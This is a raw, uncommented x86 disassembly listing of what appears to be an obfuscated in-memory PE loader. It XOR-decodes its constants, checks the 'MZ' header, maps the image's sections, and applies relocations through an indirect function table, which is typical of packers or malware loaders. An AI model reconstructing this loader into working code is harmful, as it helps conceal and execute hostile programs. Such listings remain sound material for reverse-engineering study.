  41e807:	leave  
  41e808:	ret    0x8
  41e80b:	push   ebp
  41e80c:	mov    ebp,esp
  41e80e:	sub    esp,0x2c
  41e811:	mov    edx,0xf89c8585
  41e816:	mov    DWORD PTR [ebp-0x4],edx
  41e819:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  41e820:	mov    eax,DWORD PTR [ebp-0x4]
  41e823:	mov    ecx,DWORD PTR [ebp-0x4]
  41e826:	mov    ecx,DWORD PTR [ebp-0x4]
  41e829:	mov    ecx,DWORD PTR [ebp-0x4]
  41e82c:	mov    ecx,DWORD PTR [ebp-0x4]
  41e82f:	mov    ecx,DWORD PTR [ebp-0x4]
  41e832:	push   ebx
  41e833:	mov    ebx,DWORD PTR [ebp+0x10]
  41e836:	push   esi
  41e837:	mov    esi,0x751089b
  41e83c:	mov    DWORD PTR [ebp-0x10],0x352eb0f
  41e843:	mov    ecx,DWORD PTR [ebp-0x4]
  41e846:	mov    ebx,DWORD PTR [ebx+0x190]
  41e84c:	push   edi
  41e84d:	mov    edi,0x3272e2
  41e852:	xor    ecx,esi
  41e854:	xor    eax,esi
  41e856:	add    eax,edi
  41e858:	add    ecx,edi
  41e85a:	mov    DWORD PTR [ebp-0x18],eax
  41e85d:	cmp    ecx,DWORD PTR [ebx]
  41e85f:	je     0x41eae0
  41e865:	mov    ebx,DWORD PTR [ebp-0x4]
  41e868:	mov    ecx,DWORD PTR [ebp+0xc]
  41e86b:	xor    ebx,esi
  41e86d:	add    ebx,edi
  41e86f:	cmp    ebx,ecx
  41e871:	je     0x41eae0
  41e877:	mov    ebx,DWORD PTR [ebp-0x4]
  41e87a:	mov    ecx,DWORD PTR [ecx+0x80]
  41e880:	xor    ebx,esi
  41e882:	add    ebx,edi
  41e884:	cmp    ecx,ebx
  41e886:	je     0x41eadb
  41e88c:	add    ecx,DWORD PTR [ebp+0x8]
  41e88f:	mov    DWORD PTR [ebp-0x2c],ecx
  41e892:	mov    ebx,edx
  41e894:	xor    ebx,esi
  41e896:	add    ebx,edi
  41e898:	mov    DWORD PTR [ebp-0x10],ebx
  41e89b:	mov    ebx,DWORD PTR [ebp-0x10]
  41e89e:	cmp    ebx,edx
  41e8a0:	je     0x41e8b4
  41e8a2:	mov    edx,DWORD PTR [ebp-0x10]
  41e8a5:	mov    ebx,DWORD PTR [ebp-0x4]
  41e8a8:	imul   edx,edx,0x14
  41e8ab:	xor    ebx,esi
  41e8ad:	add    ebx,edi
  41e8af:	cmp    DWORD PTR [edx+ecx*1],ebx
  41e8b2:	jne    0x41e8cb
  41e8b4:	mov    edx,DWORD PTR [ebp-0x10]
  41e8b7:	mov    ebx,DWORD PTR [ebp-0x4]
  41e8ba:	imul   edx,edx,0x14
  41e8bd:	xor    ebx,esi
  41e8bf:	add    ebx,edi
  41e8c1:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  41e8c5:	je     0x41eacd
  41e8cb:	mov    eax,DWORD PTR [ebp-0x4]
  41e8ce:	mov    ebx,DWORD PTR [ebp-0x4]
  41e8d1:	mov    eax,DWORD PTR [ebp-0x10]
  41e8d4:	imul   eax,eax,0x14
  41e8d7:	add    eax,ecx
  41e8d9:	mov    ecx,DWORD PTR [eax+0x10]
  41e8dc:	add    ecx,DWORD PTR [ebp+0x8]
  41e8df:	xor    ebx,esi
  41e8e1:	mov    DWORD PTR [ebp-0x1c],ecx
  41e8e4:	mov    ecx,DWORD PTR [ebp-0x4]
  41e8e7:	mov    edx,DWORD PTR [ebp-0x4]
  41e8ea:	xor    ecx,esi
  41e8ec:	add    ecx,edi
  41e8ee:	xor    edx,esi
  41e8f0:	mov    DWORD PTR [ebp-0x24],ecx
  41e8f3:	mov    ecx,DWORD PTR [eax]
  41e8f5:	add    edx,edi
  41e8f7:	add    ebx,edi
  41e8f9:	cmp    ecx,edx
  41e8fb:	je     0x41e903
  41e8fd:	add    ecx,DWORD PTR [ebp+0x8]
  41e900:	mov    DWORD PTR [ebp-0x24],ecx
  41e903:	mov    ecx,DWORD PTR [ebp-0x4]
  41e906:	xor    ecx,esi
  41e908:	add    ecx,DWORD PTR [eax+0xc]
  41e90b:	mov    eax,DWORD PTR [ebp+0x8]
  41e90e:	lea    eax,[ecx+eax*1+0x3272e2]
  41e915:	mov    DWORD PTR [ebp+0xc],eax
  41e918:	mov    DWORD PTR [ebp-0x28],0xf89c85b8
  41e91f:	mov    eax,DWORD PTR [ebp+0x10]
  41e922:	push   DWORD PTR [ebp+0xc]
  41e925:	mov    eax,DWORD PTR [eax+0x1d8]
  41e92b:	call   DWORD PTR [eax]
  41e92d:	mov    ecx,DWORD PTR [ebp-0x4]
  41e930:	xor    ecx,esi
  41e932:	add    ecx,edi
  41e934:	mov    DWORD PTR [ebp-0xc],eax
  41e937:	cmp    ecx,eax
  41e939:	jne    0x41e94d
  41e93b:	mov    eax,DWORD PTR [ebp+0x10]
  41e93e:	push   DWORD PTR [ebp+0xc]
  41e941:	mov    eax,DWORD PTR [eax+0x1d8]
  41e947:	call   DWORD PTR [eax+0xc]
  41e94a:	mov    DWORD PTR [ebp-0xc],eax
  41e94d:	mov    DWORD PTR [ebp-0x20],0x7f661b0c
  41e954:	mov    DWORD PTR [ebp-0x20],0xf89c999c
  41e95b:	mov    eax,DWORD PTR [ebp-0x4]
  41e95e:	xor    eax,esi
  41e960:	add    eax,edi
  41e962:	cmp    eax,DWORD PTR [ebp-0xc]
  41e965:	jne    0x41e98a
  41e967:	mov    eax,DWORD PTR [ebp-0x8]
  41e96a:	mov    ecx,DWORD PTR [ebp-0x20]
  41e96d:	xor    eax,esi
  41e96f:	xor    ecx,esi
  41e971:	lea    ebx,[ebx+eax*1+0x3272e2]
  41e978:	mov    eax,DWORD PTR [ebp+0x10]
  41e97b:	mov    eax,DWORD PTR [eax+0x1d8]
  41e981:	add    ecx,edi
  41e983:	imul   ecx,ebx
  41e986:	push   ecx
  41e987:	call   DWORD PTR [eax+0x24]
  41e98a:	mov    eax,DWORD PTR [ebp-0x4]
  41e98d:	xor    eax,esi
  41e98f:	add    eax,edi
  41e991:	cmp    eax,DWORD PTR [ebp-0xc]
  41e994:	jne    0x41e9a5
  41e996:	mov    eax,DWORD PTR [ebp-0x28]
  41e999:	xor    eax,esi
  41e99b:	add    eax,edi
  41e99d:	cmp    ebx,eax
  41e99f:	jbe    0x41e91f
  41e9a5:	mov    eax,DWORD PTR [ebp-0x4]
  41e9a8:	xor    eax,esi
  41e9aa:	add    eax,edi
  41e9ac:	cmp    eax,DWORD PTR [ebp-0xc]
  41e9af:	jne    0x41e9c8
  41e9b1:	mov    eax,DWORD PTR [ebp-0x8]
  41e9b4:	mov    ecx,DWORD PTR [ebp-0x18]
  41e9b7:	xor    eax,esi
  41e9b9:	lea    eax,[ecx+eax*1+0x3272e2]
  41e9c0:	mov    DWORD PTR [ebp-0x18],eax
  41e9c3:	jmp    0x41eab7
  41e9c8:	mov    DWORD PTR [ebp-0x14],0x1121b0d
  41e9cf:	mov    DWORD PTR [ebp+0xc],0xe042d0f
  41e9d6:	mov    ebx,DWORD PTR [ebp-0x4]
  41e9d9:	xor    ebx,esi
  41e9db:	add    ebx,edi
  41e9dd:	jmp    0x41eaa4
  41e9e2:	mov    eax,DWORD PTR [ebp-0x4]
  41e9e5:	xor    eax,esi
  41e9e7:	add    eax,edi
  41e9e9:	mov    DWORD PTR [ebp-0x14],eax
  41e9ec:	mov    eax,DWORD PTR [ebp-0x4]
  41e9ef:	xor    eax,esi
  41e9f1:	add    eax,edi
  41e9f3:	mov    DWORD PTR [ebp+0xc],eax
  41e9f6:	mov    ecx,DWORD PTR [ebp-0x4]
  41e9f9:	mov    eax,DWORD PTR [ebp-0x24]
  41e9fc:	xor    ecx,esi
  41e9fe:	add    ecx,edi
  41ea00:	cmp    ecx,eax
  41ea02:	je     0x41ea0a
  41ea04:	mov    eax,DWORD PTR [eax+ebx*4]
  41ea07:	mov    DWORD PTR [ebp-0x14],eax
  41ea0a:	mov    eax,DWORD PTR [ebp-0x1c]
  41ea0d:	mov    eax,DWORD PTR [eax+ebx*4]
  41ea10:	mov    DWORD PTR [ebp+0xc],eax
  41ea13:	mov    eax,DWORD PTR [ebp-0x4]
  41ea16:	mov    ecx,DWORD PTR [ebp-0x14]
  41ea19:	xor    eax,esi
  41ea1b:	add    eax,edi
  41ea1d:	cmp    eax,ecx
  41ea1f:	je     0x41ea4a
  41ea21:	mov    eax,DWORD PTR [ebp-0x4]
  41ea24:	mov    ecx,DWORD PTR [ebp-0x14]
  41ea27:	xor    eax,esi
  41ea29:	add    eax,edi
  41ea2b:	shr    ecx,0x1f
  41ea2e:	cmp    eax,ecx
  41ea30:	je     0x41ea4a
  41ea32:	mov    ecx,DWORD PTR [ebp-0x14]
  41ea35:	mov    eax,DWORD PTR [ebp+0x10]
  41ea38:	mov    eax,DWORD PTR [eax+0x1d8]
  41ea3e:	movzx  ecx,cx
  41ea41:	push   ecx
  41ea42:	push   DWORD PTR [ebp-0xc]
  41ea45:	call   DWORD PTR [eax+0x8]
  41ea48:	jmp    0x41ea63
  41ea4a:	mov    eax,DWORD PTR [ebp+0xc]
  41ea4d:	add    eax,DWORD PTR [ebp+0x8]
  41ea50:	mov    ecx,DWORD PTR [ebp+0x10]
  41ea53:	mov    ecx,DWORD PTR [ecx+0x1d8]
  41ea59:	add    eax,0x2
  41ea5c:	push   eax
  41ea5d:	push   DWORD PTR [ebp-0xc]
  41ea60:	call   DWORD PTR [ecx+0x8]
  41ea63:	mov    DWORD PTR [ebp+0xc],eax
  41ea66:	mov    eax,DWORD PTR [ebp-0x4]
  41ea69:	mov    ecx,DWORD PTR [ebp+0xc]
  41ea6c:	xor    eax,esi
  41ea6e:	add    eax,edi
  41ea70:	cmp    eax,ecx
  41ea72:	mov    eax,DWORD PTR [ebp-0x8]
  41ea75:	jne    0x41ea88
  41ea77:	mov    ecx,DWORD PTR [ebp-0x18]
  41ea7a:	xor    eax,esi
  41ea7c:	lea    eax,[ecx+eax*1+0x3272e2]
  41ea83:	mov    DWORD PTR [ebp-0x18],eax
  41ea86:	jmp    0x41ea98
  41ea88:	mov    ecx,DWORD PTR [ebp+0xc]
  41ea8b:	xor    eax,esi
  41ea8d:	add    eax,edi
  41ea8f:	imul   eax,ecx
  41ea92:	mov    ecx,DWORD PTR [ebp-0x1c]
  41ea95:	mov    DWORD PTR [ecx+ebx*4],eax
  41ea98:	mov    eax,DWORD PTR [ebp-0x8]
  41ea9b:	xor    eax,esi
  41ea9d:	lea    ebx,[ebx+eax*1+0x3272e2]
  41eaa4:	mov    eax,DWORD PTR [ebp-0x4]
  41eaa7:	mov    ecx,DWORD PTR [ebp-0x1c]
  41eaaa:	xor    eax,esi
  41eaac:	add    eax,edi
  41eaae:	cmp    DWORD PTR [ecx+ebx*4],eax
  41eab1:	jne    0x41e9e2
  41eab7:	mov    edx,DWORD PTR [ebp-0x10]
  41eaba:	mov    eax,DWORD PTR [ebp-0x18]
  41eabd:	mov    ecx,DWORD PTR [ebp-0x2c]
  41eac0:	sub    edx,0x3272e1
  41eac6:	xor    edx,esi
  41eac8:	jmp    0x41e892
  41eacd:	mov    ecx,DWORD PTR [ebp-0x4]
  41ead0:	xor    ecx,esi
  41ead2:	add    ecx,edi
  41ead4:	cmp    eax,ecx
  41ead6:	mov    eax,DWORD PTR [ebp-0x4]
  41ead9:	jne    0x41eae3
  41eadb:	mov    eax,DWORD PTR [ebp-0x8]
  41eade:	jmp    0x41eae3
  41eae0:	mov    eax,DWORD PTR [ebp-0x4]
  41eae3:	xor    eax,esi
  41eae5:	add    eax,edi
  41eae7:	pop    edi
  41eae8:	pop    esi
  41eae9:	pop    ebx
  41eaea:	leave  
  41eaeb:	ret    0xc
  41eaee:	push   ebp
  41eaef:	mov    ebp,esp
  41eaf1:	sub    esp,0x28
  41eaf4:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  41eafb:	mov    DWORD PTR [ebp-0x28],0xf89c8584
  41eb02:	mov    eax,DWORD PTR [ebp+0xc]
  41eb05:	mov    DWORD PTR [ebp+0xc],eax
  41eb08:	push   esi
  41eb09:	mov    eax,eax
  41eb0b:	mov    eax,DWORD PTR [ebp-0x4]
  41eb0e:	mov    esi,DWORD PTR [ebp+0x8]
  41eb11:	mov    ecx,0x751089b
  41eb16:	xor    eax,ecx
  41eb18:	mov    edx,0x3272e2
  41eb1d:	add    eax,edx
  41eb1f:	cmp    esi,eax
  41eb21:	je     0x41ec48
  41eb27:	mov    eax,DWORD PTR [ebp+0x8]
  41eb2a:	mov    esi,DWORD PTR [ebp+0x8]
  41eb2d:	add    esi,DWORD PTR [eax+0x3c]
  41eb30:	push   edi
  41eb31:	mov    DWORD PTR [ebp+0xc],esi
  41eb34:	mov    DWORD PTR [ebp-0x1c],0xf89c85b8
  41eb3b:	mov    eax,DWORD PTR [ebp-0x1c]
  41eb3e:	mov    esi,DWORD PTR [ebp-0x4]
  41eb41:	mov    edi,DWORD PTR [ebp+0xc]
  41eb44:	xor    esi,ecx
  41eb46:	xor    eax,ecx
  41eb48:	add    esi,edx
  41eb4a:	cmp    DWORD PTR [edi+eax*8+0x1939788],esi
  41eb51:	je     0x41ec42
  41eb57:	mov    esi,DWORD PTR [ebp+0xc]
  41eb5a:	mov    eax,DWORD PTR [ebp+0x8]
  41eb5d:	add    eax,DWORD PTR [esi+0xa0]
  41eb63:	mov    esi,DWORD PTR [ebp+0x8]
  41eb66:	mov    edi,DWORD PTR [ebp+0xc]
  41eb69:	sub    esi,DWORD PTR [edi+0x34]
  41eb6c:	mov    edi,DWORD PTR [ebp-0x4]
  41eb6f:	xor    edi,ecx
  41eb71:	add    edi,edx
  41eb73:	mov    DWORD PTR [ebp-0x24],esi
  41eb76:	cmp    esi,edi
  41eb78:	je     0x41ec42
  41eb7e:	mov    esi,DWORD PTR [ebp-0x4]
  41eb81:	xor    esi,ecx
  41eb83:	add    esi,edx
  41eb85:	mov    DWORD PTR [ebp-0x8],esi
  41eb88:	push   ebx
  41eb89:	mov    DWORD PTR [ebp-0x10],0xf89c85ba
  41eb90:	jmp    0x41ec2c
  41eb95:	mov    esi,DWORD PTR [ebp-0x4]
  41eb98:	xor    esi,ecx
  41eb9a:	lea    edi,[ebx-0x8]
  41eb9d:	add    esi,edx
  41eb9f:	shr    edi,1
  41eba1:	cmp    esi,edi
  41eba3:	jae    0x41ec12
  41eba5:	sub    edi,esi
  41eba7:	lea    ebx,[eax+esi*2+0x8]
  41ebab:	mov    DWORD PTR [ebp-0x18],edi
  41ebae:	movzx  esi,WORD PTR [ebx]
  41ebb1:	and    esi,0xfff
  41ebb7:	mov    DWORD PTR [ebp-0x14],esi
  41ebba:	mov    edi,DWORD PTR [ebp-0x14]
  41ebbd:	mov    esi,DWORD PTR [eax]
  41ebbf:	sub    esi,edx
  41ebc1:	add    edi,esi
  41ebc3:	movzx  esi,WORD PTR [ebx]
  41ebc6:	shr    esi,0xc
  41ebc9:	xor    edi,ecx
  41ebcb:	mov    DWORD PTR [ebp-0x20],edi
  41ebce:	mov    DWORD PTR [ebp-0x14],esi
  41ebd1:	mov    esi,DWORD PTR [ebp-0x20]
  41ebd4:	mov    edi,DWORD PTR [ebp+0x8]
  41ebd7:	xor    esi,ecx
  41ebd9:	lea    esi,[esi+edi*1+0x3272e2]
  41ebe0:	mov    DWORD PTR [ebp-0x20],esi
  41ebe3:	mov    esi,DWORD PTR [ebp-0x10]
  41ebe6:	mov    edi,DWORD PTR [ebp-0x14]
  41ebe9:	xor    esi,ecx
  41ebeb:	add    esi,edx
  41ebed:	cmp    edi,esi
  41ebef:	jne    0x41ec07
  41ebf1:	mov    esi,DWORD PTR [ebp-0x10]
  41ebf4:	mov    edi,DWORD PTR [ebp-0x14]
  41ebf7:	xor    esi,ecx
  41ebf9:	add    esi,edx
  41ebfb:	cmp    edi,esi
  41ebfd:	jne    0x41ec07
  41ebff:	mov    esi,DWORD PTR [ebp-0x20]
  41ec02:	mov    edi,DWORD PTR [ebp-0x24]
  41ec05:	add    DWORD PTR [esi],edi
  41ec07:	add    ebx,0x2
  41ec0a:	dec    DWORD PTR [ebp-0x18]
  41ec0d:	jne    0x41ebae
  41ec0f:	mov    ebx,DWORD PTR [ebp-0xc]
  41ec12:	add    DWORD PTR [ebp-0x8],ebx
  41ec15:	mov    esi,DWORD PTR [ebp-0x1c]
  41ec18:	mov    edi,DWORD PTR [ebp-0x8]
  41ec1b:	mov    ebx,DWORD PTR [ebp+0xc]
  41ec1e:	xor    esi,ecx
  41ec20:	cmp    edi,DWORD PTR [ebx+esi*8+0x193978c]
  41ec27:	jae    0x41ec41
  41ec29:	add    eax,DWORD PTR [ebp-0xc]
  41ec2c:	mov    esi,DWORD PTR [ebp-0x4]
  41ec2f:	mov    ebx,DWORD PTR [eax+0x4]
  41ec32:	xor    esi,ecx
  41ec34:	add    esi,edx
  41ec36:	mov    DWORD PTR [ebp-0xc],ebx
  41ec39:	cmp    ebx,esi
  41ec3b:	jne    0x41eb95
  41ec41:	pop    ebx
  41ec42:	mov    eax,DWORD PTR [ebp-0x28]
  41ec45:	pop    edi
  41ec46:	jmp    0x41ec4b
  41ec48:	mov    eax,DWORD PTR [ebp-0x4]
  41ec4b:	xor    eax,ecx
  41ec4d:	add    eax,edx
  41ec4f:	pop    esi
  41ec50:	leave  
  41ec51:	ret    0x8
  41ec54:	push   ebp
  41ec55:	mov    ebp,esp
  41ec57:	sub    esp,0xcc
  41ec5d:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  41ec64:	mov    DWORD PTR [ebp-0x24],0xf89c8584
  41ec6b:	mov    eax,DWORD PTR [ebp-0x4]
  41ec6e:	push   ebx
  41ec6f:	push   esi
  41ec70:	mov    esi,0x751089b
  41ec75:	xor    eax,esi
  41ec77:	push   edi
  41ec78:	mov    edi,0x3272e2
  41ec7d:	add    eax,edi
  41ec7f:	mov    DWORD PTR [ebp-0x1c],eax
  41ec82:	mov    eax,DWORD PTR [ebp-0x4]
  41ec85:	xor    eax,esi
  41ec87:	add    eax,edi
  41ec89:	mov    DWORD PTR [ebp-0x8],eax
  41ec8c:	mov    ebx,DWORD PTR [ebp+0x20]
  41ec8f:	mov    eax,DWORD PTR [ebp-0x14]
  41ec92:	mov    ecx,DWORD PTR [ebp-0x14]
  41ec95:	xor    eax,ecx
  41ec97:	mov    DWORD PTR [ebp-0x14],eax
  41ec9a:	add    DWORD PTR [ebp-0x14],0xf89cb585
  41eca1:	mov    eax,DWORD PTR [ebp-0xc]
  41eca4:	mov    ecx,DWORD PTR [ebp-0xc]
  41eca7:	xor    eax,ecx
  41eca9:	mov    DWORD PTR [ebp-0xc],eax
  41ecac:	add    DWORD PTR [ebp-0xc],0xf89c85c5
  41ecb3:	mov    eax,DWORD PTR [ebp-0x10]
  41ecb6:	mov    ecx,DWORD PTR [ebp-0x10]
  41ecb9:	xor    eax,ecx
  41ecbb:	mov    DWORD PTR [ebp-0x10],eax
  41ecbe:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  41ecc5:	mov    eax,DWORD PTR [ebp-0x20]
  41ecc8:	mov    ecx,DWORD PTR [ebp-0x20]
  41eccb:	xor    eax,ecx
  41eccd:	mov    DWORD PTR [ebp-0x20],eax
  41ecd0:	add    DWORD PTR [ebp-0x20],0xf89f0585
  41ecd7:	mov    eax,0x9471
  41ecdc:	mov    WORD PTR [ebp+0x20],ax
  41ece0:	mov    eax,DWORD PTR [ebp+0x8]
  41ece3:	test   eax,eax
  41ece5:	je     0x41f140
  41eceb:	mov    eax,DWORD PTR [ebp+0xc]
  41ecee:	test   eax,eax
  41ecf0:	je     0x41f140
  41ecf6:	mov    eax,DWORD PTR [ebp+0x18]
  41ecf9:	test   eax,eax
  41ecfb:	je     0x41f140
  41ed01:	mov    ax,WORD PTR [ebp+0x20]
  41ed05:	mov    ecx,0x8a8d
  41ed0a:	xor    ax,cx
  41ed0d:	mov    ecx,0x3b51
  41ed12:	add    ax,cx
  41ed15:	mov    ecx,DWORD PTR [ebp+0x8]
  41ed18:	cmp    WORD PTR [ecx],ax
  41ed1b:	jne    0x41f140
  41ed21:	mov    eax,DWORD PTR [ebp-0x4]
  41ed24:	xor    eax,esi
  41ed26:	add    eax,edi
  41ed28:	mov    DWORD PTR [ebp-0x30],eax
  41ed2b:	mov    eax,DWORD PTR [ebp-0x4]
  41ed2e:	mov    ecx,DWORD PTR [ebp+0x8]
  41ed31:	mov    eax,DWORD PTR [ebp+0x8]
  41ed34:	add    eax,DWORD PTR [ecx+0x3c]
  41ed37:	mov    DWORD PTR [ebp+0xc],eax
  41ed3a:	mov    eax,DWORD PTR [eax+0x50]
  41ed3d:	test   eax,eax
  41ed3f:	je     0x41f140
  41ed45:	mov    DWORD PTR [ebp-0x2c],0xf88c8585
  41ed4c:	mov    eax,DWORD PTR [ebp-0x2c]
  41ed4f:	xor    eax,esi
  41ed51:	add    eax,edi
  41ed53:	mov    DWORD PTR [ebp-0x2c],eax
  41ed56:	mov    eax,DWORD PTR [ebp-0x4]
  41ed59:	mov    eax,DWORD PTR [ebx+0x190]
  41ed5f:	mov    ecx,DWORD PTR [eax]
  41ed61:	mov    ecx,DWORD PTR [ecx+0x3c]
  41ed64:	add    ecx,DWORD PTR [eax]
  41ed66:	mov    eax,DWORD PTR [ebp-0x4]
  41ed69:	mov    eax,DWORD PTR [ebx+0x18c]
  41ed6f:	mov    edx,DWORD PTR [eax]
  41ed71:	mov    DWORD PTR [ebp-0x18],ecx
  41ed74:	mov    DWORD PTR [ebp+0x20],edx
  41ed77:	cmp    edx,edx
  41ed79:	jne    0x41edad
  41ed7b:	mov    eax,DWORD PTR [ebx+0x1d8]
  41ed81:	lea    edx,[ebp-0x1c]
  41ed84:	push   edx
  41ed85:	mov    edx,DWORD PTR [ebp-0xc]
  41ed88:	xor    edx,esi
  41ed8a:	add    edx,edi
  41ed8c:	push   edx
  41ed8d:	push   DWORD PTR [ecx+0x50]
  41ed90:	push   DWORD PTR [ebp+0x20]
  41ed93:	call   DWORD PTR [eax+0x1c]
  41ed96:	mov    eax,DWORD PTR [ebp-0x18]
  41ed99:	mov    ecx,DWORD PTR [eax+0x54]
  41ed9c:	mov    eax,DWORD PTR [eax+0x50]
  41ed9f:	sub    eax,ecx
  41eda1:	add    ecx,DWORD PTR [ebp+0x20]
  41eda4:	push   ecx
  41eda5:	call   0x41f72c
  41edaa:	mov    edx,DWORD PTR [ebp+0x20]
  41edad:	mov    eax,DWORD PTR [ebx+0x194]
  41edb3:	mov    DWORD PTR [eax],edx
  41edb5:	mov    eax,DWORD PTR [ebp+0xc]
  41edb8:	push   DWORD PTR [eax+0x54]
  41edbb:	push   DWORD PTR [ebp+0x8]
  41edbe:	push   edx
  41edbf:	call   0x41f5d3
  41edc4:	mov    ecx,DWORD PTR [ebp+0x20]
  41edc7:	mov    eax,DWORD PTR [ecx+0x3c]
  41edca:	add    eax,ecx
  41edcc:	movzx  ecx,WORD PTR [eax+0x14]
  41edd0:	lea    ecx,[ecx+eax*1+0x18]
  41edd4:	mov    DWORD PTR [ebp+0x18],ecx
  41edd7:	mov    ecx,DWORD PTR [ebp-0x4]
  41edda:	movzx  edx,WORD PTR [eax+0x6]
  41edde:	xor    ecx,esi
  41ede0:	add    ecx,edi
  41ede2:	mov    DWORD PTR [ebp+0xc],eax
  41ede5:	cmp    edx,ecx
  41ede7:	je     0x41ee94
  41eded:	mov    ecx,DWORD PTR [ebp-0x4]
  41edf0:	xor    ecx,esi
  41edf2:	add    ecx,edi
  41edf4:	mov    DWORD PTR [ebp-0x8],ecx
  41edf7:	mov    ecx,DWORD PTR [ebp-0x24]
  41edfa:	movzx  edx,WORD PTR [eax+0x6]
  41edfe:	xor    ecx,esi
  41ee00:	sub    edx,ecx
  41ee02:	sub    edx,edi
  41ee04:	cmp    DWORD PTR [ebp-0x8],edx
  41ee07:	ja     0x41ee94
  41ee0d:	mov    edx,DWORD PTR [ebp+0x18]
  41ee10:	add    edx,0x8
  41ee13:	mov    DWORD PTR [ebp+0x18],edx
  41ee16:	jmp    0x41ee1b
  41ee18:	mov    edx,DWORD PTR [ebp+0x18]
  41ee1b:	mov    eax,DWORD PTR [eax+0x38]
  41ee1e:	lea    ecx,[eax-0x1]
  41ee21:	mov    DWORD PTR [ebp-0x34],eax
  41ee24:	mov    eax,DWORD PTR [edx]
  41ee26:	test   ecx,eax
  41ee28:	je     0x41ee31
  41ee2a:	not    ecx
  41ee2c:	and    eax,ecx
  41ee2e:	add    eax,DWORD PTR [ebp-0x34]
  41ee31:	mov    ecx,DWORD PTR [edx+0x4]
  41ee34:	add    ecx,DWORD PTR [ebp+0x20]
  41ee37:	push   ecx
  41ee38:	call   0x41f72c
  41ee3d:	mov    edx,DWORD PTR [ebp-0x4]
  41ee40:	mov    eax,DWORD PTR [ebp+0x18]
  41ee43:	mov    ecx,DWORD PTR [eax+0x8]
  41ee46:	xor    edx,esi
  41ee48:	add    edx,edi
  41ee4a:	cmp    ecx,edx
  41ee4c:	je     0x41ee65
  41ee4e:	push   ecx
  41ee4f:	mov    ecx,DWORD PTR [ebp+0x8]
  41ee52:	add    ecx,DWORD PTR [eax+0xc]
  41ee55:	mov    eax,DWORD PTR [eax+0x4]
  41ee58:	add    eax,DWORD PTR [ebp+0x20]
  41ee5b:	push   ecx
  41ee5c:	push   eax
  41ee5d:	call   0x41f5d3
  41ee62:	mov    eax,DWORD PTR [ebp+0x18]
  41ee65:	mov    ecx,DWORD PTR [ebp-0x24]
  41ee68:	mov    edx,DWORD PTR [ebp-0x8]
  41ee6b:	add    eax,0x28
  41ee6e:	xor    ecx,esi
  41ee70:	lea    ecx,[edx+ecx*1+0x3272e2]
  41ee77:	mov    edx,DWORD PTR [ebp+0xc]
  41ee7a:	mov    DWORD PTR [ebp+0x18],eax
  41ee7d:	mov    eax,DWORD PTR [ebp-0x24]
  41ee80:	movzx  edx,WORD PTR [edx+0x6]
  41ee84:	xor    eax,esi
  41ee86:	sub    edx,eax
  41ee88:	mov    eax,DWORD PTR [ebp+0xc]
  41ee8b:	sub    edx,edi
  41ee8d:	mov    DWORD PTR [ebp-0x8],ecx
  41ee90:	cmp    ecx,edx
  41ee92:	jbe    0x41ee18
  41ee94:	mov    edx,DWORD PTR [ebx+0x18c]
  41ee9a:	mov    ecx,DWORD PTR [ebp+0x20]
  41ee9d:	cmp    ecx,DWORD PTR [edx]
  41ee9f:	jne    0x41eec8
  41eea1:	mov    eax,DWORD PTR [ebx+0x1d8]
  41eea7:	lea    edx,[ebp-0x1c]
  41eeaa:	push   edx
  41eeab:	mov    edx,DWORD PTR [ebp-0x10]
  41eeae:	xor    edx,esi
  41eeb0:	add    edx,edi
  41eeb2:	push   edx
  41eeb3:	mov    edx,DWORD PTR [ebp-0x18]
  41eeb6:	push   DWORD PTR [edx+0x54]
  41eeb9:	push   ecx
  41eeba:	call   DWORD PTR [eax+0x1c]
  41eebd:	test   eax,eax
  41eebf:	je     0x41f131
  41eec5:	mov    eax,DWORD PTR [ebp+0xc]
  41eec8:	mov    ecx,DWORD PTR [ebx+0x1c8]
  41eece:	mov    ecx,DWORD PTR [ecx]
  41eed0:	xor    ecx,esi
  41eed2:	add    ecx,edi
  41eed4:	je     0x41f05c
  41eeda:	and    DWORD PTR [ebp-0x28],0x0
  41eede:	and    DWORD PTR [ebp+0x8],0x0
  41eee2:	mov    eax,0xf89c8519
  41eee7:	lea    ecx,[eax-0x8]
  41eeea:	mov    DWORD PTR [ebp-0x4c],0xf89c8517
  41eef1:	mov    DWORD PTR [ebp-0x48],0xf89c8509
  41eef8:	mov    DWORD PTR [ebp-0x44],eax
  41eefb:	mov    DWORD PTR [ebp-0x40],ecx
  41eefe:	mov    DWORD PTR [ebp-0x3c],ecx
  41ef01:	mov    DWORD PTR [ebp-0x38],0xf89c8585
  41ef08:	mov    edx,DWORD PTR [ebp+0x8]
  41ef0b:	mov    ecx,0x89b
  41ef10:	xor    cx,WORD PTR [ebp+edx*4-0x4c]
  41ef15:	mov    edx,0x72e2
  41ef1a:	add    cx,dx
  41ef1d:	mov    edx,DWORD PTR [ebp+0x8]
  41ef20:	inc    DWORD PTR [ebp+0x8]
  41ef23:	cmp    DWORD PTR [ebp+0x8],0x6
  41ef27:	mov    WORD PTR [ebp+edx*2-0xb4],cx
  41ef2f:	jb     0x41ef08
  41ef31:	mov    ecx,0xf89c850b
  41ef36:	mov    DWORD PTR [ebp-0xa4],eax
  41ef3c:	mov    DWORD PTR [ebp-0x90],eax
  41ef42:	mov    DWORD PTR [ebp-0x68],eax
  41ef45:	mov    DWORD PTR [ebp-0x64],eax
  41ef48:	lea    eax,[ecx-0x1]
  41ef4b:	mov    edx,0xf89c85ff
  41ef50:	mov    DWORD PTR [ebp-0x58],eax
  41ef53:	mov    DWORD PTR [ebp-0x54],eax
  41ef56:	mov    DWORD PTR [ebp-0xa8],0xf89c85f1
  41ef60:	mov    DWORD PTR [ebp-0xa0],ecx
  41ef66:	mov    DWORD PTR [ebp-0x9c],edx
  41ef6c:	mov    DWORD PTR [ebp-0x98],0xf89c851c
  41ef76:	mov    DWORD PTR [ebp-0x94],0xf89c8517
  41ef80:	mov    DWORD PTR [ebp-0x8c],0xf89c85f8
  41ef8a:	mov    DWORD PTR [ebp-0x88],0xf89c8517
  41ef94:	mov    DWORD PTR [ebp-0x84],0xf89c8509
  41ef9e:	mov    DWORD PTR [ebp-0x80],ecx
  41efa1:	mov    DWORD PTR [ebp-0x7c],0xf89c850c
  41efa8:	mov    DWORD PTR [ebp-0x78],edx
  41efab:	mov    DWORD PTR [ebp-0x74],0xf89c8516
  41efb2:	mov    DWORD PTR [ebp-0x70],ecx
